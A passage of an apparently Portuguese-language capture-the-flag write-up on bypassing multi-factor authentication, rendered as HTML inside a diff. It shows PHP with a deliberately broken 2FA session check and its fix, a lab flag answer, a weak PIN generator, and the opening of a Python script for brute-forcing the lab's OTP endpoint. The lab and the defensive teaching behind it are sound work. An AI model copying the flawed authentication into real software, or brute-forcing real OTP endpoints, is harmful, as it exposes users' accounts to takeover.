+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;authenticated&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# Session that is used to check if the user completed the 2FA
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ROOT_DIR&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/dashboard&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;No exemplo acima o usuário só pode ser redirecionado para a página &lt;code&gt;dashboard&lt;/code&gt;após informar o código correto do 2FA.&lt;/p&gt;
+&lt;p&gt;No exemplo abaixo, não é feito as devidas verificações, após o usuário autenticar na aplicação com &lt;code&gt;e-mail&lt;/code&gt;e &lt;code&gt;senha&lt;/code&gt;, já possível acessar a &lt;code&gt;dashboard&lt;/code&gt; sem o 2FA.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;authenticate&lt;/span&gt;($email, $password){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $pdo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_db_connection&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $stmt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $pdo&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;prepare&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SELECT `password` FROM users WHERE email = :email&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;execute&lt;/span&gt;([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; $email]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;PDO&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;FETCH_ASSOC&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $user &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;password_verify&lt;/span&gt;($password, $user[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;authenticate&lt;/span&gt;($email, $password)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;authenticated&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# This flag should only be issued after the MFA completion
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ROOT_DIR&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/mfa&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Para remediar essa vulnerabilidade, o cookie ou sessão que é usado em verificações de autenticação deve ser dividido em duas partes.
+A primeira parte é a que define a sessão após a verificação bem-sucedida do nome de usuário e senha; o único propósito desta sessão é enviar um token 2FA.
+A segunda sessão deve ser somente após o OTP ser validado.&lt;/p&gt;
+&lt;p&gt;Exemplo de código&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Parte 1: Sessão para verificar o nome de usuário e a senha
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;session_start&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;auth&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;authenticated_user&amp;#39;&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// Sessão após a verificação bem-sucedida do nome de usuário e senha
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setcookie&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;auth_session&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;session_id&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3600&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;example.com&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Verificação 2FA
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;verify_2fa_code&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2fa_code&amp;#39;&lt;/span&gt;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// Parte 2: Sessão após a validação do OTP
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mfa&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mfa_validated&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;setcookie&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mfa_session&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;session_id&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3600&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;example.com&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ROOT_DIR&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/dashboard&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Token 2FA inválido.&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;What is the flag in the dashboard?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;87880e9d27001affdff90989f351c46&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;vencendo-o-recurso-de-logout-automático&#34;&gt;Vencendo o recurso de logout automático&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vencendo-o-recurso-de-logout-automático&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vencendo-o-recurso-de-logout-autom%c3%a1tico&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Em alguns aplicativos, falhar no desafio 2FA pode fazer com que o aplicativo reverta o usuário de volta para a primeira parte do processo de autenticação (ou seja, o login inicial com nome de usuário e senha). Esse comportamento geralmente ocorre devido a mecanismos de segurança projetados para evitar ataques de força bruta na parte 2FA do aplicativo. O aplicativo pode forçar o usuário a se autenticar novamente para garantir que a pessoa que tenta fazer login seja de fato o usuário legítimo e não um invasor tentando adivinhar o OTP.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;razões-comuns-para-esse-comportamento&#34;&gt;Razões comuns para esse comportamento&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;razões-comuns-para-esse-comportamento&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#raz%c3%b5es-comuns-para-esse-comportamento&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4 data-hextra-search-id=&#34;invalidação-de-sessão&#34;&gt;Invalidação de Sessão&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;invalidação-de-sessão&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#invalida%c3%a7%c3%a3o-de-sess%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Ao falhar no desafio 2FA, o aplicativo pode invalidar a sessão do usuário como medida de segurança, forçando o usuário a iniciar o processo de autenticação do zero.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;políticas-de-limitação-de-taxa-e-bloqueio&#34;&gt;Políticas de limitação de taxa e bloqueio&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;políticas-de-limitação-de-taxa-e-bloqueio&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pol%c3%adticas-de-limita%c3%a7%c3%a3o-de-taxa-e-bloqueio&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Para evitar que invasores tentem repetidamente ignorar a 2FA, o aplicativo pode ter mecanismos de limitação de taxa ou bloqueio que são acionados após um número definido de tentativas malsucedidas, revertendo o usuário para a etapa inicial de login.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;redirecionamento-orientado-à-segurança&#34;&gt;Redirecionamento orientado à segurança&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;redirecionamento-orientado-à-segurança&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#redirecionamento-orientado-%c3%a0-seguran%c3%a7a&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Alguns aplicativos são projetados para redirecionar os usuários de volta à página de login após várias tentativas malsucedidas de 2FA como uma medida de segurança adicional, garantindo que as credenciais do usuário sejam revalidadas antes de permitir outra tentativa de 2FA.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;automatização-é-a-chave&#34;&gt;Automatização é a chave&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;automatização-é-a-chave&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#automatiza%c3%a7%c3%a3o-%c3%a9-a-chave&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4 data-hextra-search-id=&#34;velocidade&#34;&gt;Velocidade&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;velocidade&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#velocidade&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Fazer login manualmente toda vez que você é desconectado é lento e tedioso. A automação pode fazer isso por você muito mais rápido.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;consistência&#34;&gt;Consistência&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;consistência&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#consist%c3%aancia&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;A automação evita erros que podem acontecer se você estiver fazendo as mesmas ações repetitivas várias vezes. É confiável.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;recuperando-se-de-logouts&#34;&gt;Recuperando-se de logouts&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;recuperando-se-de-logouts&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#recuperando-se-de-logouts&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Se o aplicativo fizer o logout após algumas tentativas malsucedidas, o script pode efetuar login novamente automaticamente e continuar tentando. Isso evita o incômodo de fazer isso manualmente todas as vezes.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;exploração-2&#34;&gt;Exploração&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;exploração-2&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#explora%c3%a7%c3%a3o-2&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A aplicação efetua o logout automaticamente do usuário, se ele informar o token 2FA incorreto, essa aplicação gera 4 dígitos (PIN) toda vez que o usuário realiza o login.&lt;br&gt;
+Laboratório:&lt;code&gt;http://mfa.thm/labs/third&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Código que gera o PIN:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;generateToken&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $token &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strval&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1250&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1350&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;token&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $token;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;success&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Vamos utilizar o script fornecido em aula, para adivinhar o PIN correto.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Define the URLs for the login, 2FA process, and dashboard&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;login_url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://mfa.thm/labs/third/&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;otp_url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://mfa.thm/labs/third/mfa&amp;#39;&lt;/span&gt;
